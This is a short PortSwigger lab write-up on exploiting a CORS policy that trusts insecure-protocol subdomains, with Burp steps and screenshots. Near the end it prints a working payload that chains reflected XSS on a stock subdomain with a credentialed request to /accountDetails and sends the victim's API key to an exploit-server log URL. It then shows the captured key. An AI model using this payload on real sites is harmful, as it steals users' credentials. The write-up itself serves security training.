## Question:

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/e3d0d699-deae-430c-b028-884e78ed19b6)

## Solution:

Check intercept is off, then use Burp's browser to log in and access your account page.

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/7a9efce5-9af3-4165-bf7a-6842d8889b68)

Review the history and observe that your key is retrieved via an AJAX request to /accountDetails, and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/d11c44cb-5c58-425d-9b3d-9e419a6942cb)

Send the request to Burp Repeater, and resubmit it with the added header `Origin: http://subdomain.lab-id` where lab-id is the lab domain name.

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/569470a4-9524-49bb-9c93-812c88e0b2c7)

Observe that the origin is reflected in the Access-Control-Allow-Origin header, confirming that the CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP.

Open a product page, click Check stock and observe that it is loaded using a HTTP URL on a subdomain.

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/94b463d9-d347-4c22-a119-6a847885b4fa)

Observe that the productID parameter is vulnerable to XSS.

In the browser, go to the exploit server and enter the following HTML, replacing YOUR-LAB-ID with your unique lab URL and YOUR-EXPLOIT-SERVER-ID with your exploit server ID:

```
<script>
    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

API KEY: `jCkUW7z83FN87dkInpIercxUqPEm4Gid`
Lab Solved

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/85ac4ba7-1fc5-456b-b022-82db44996361)

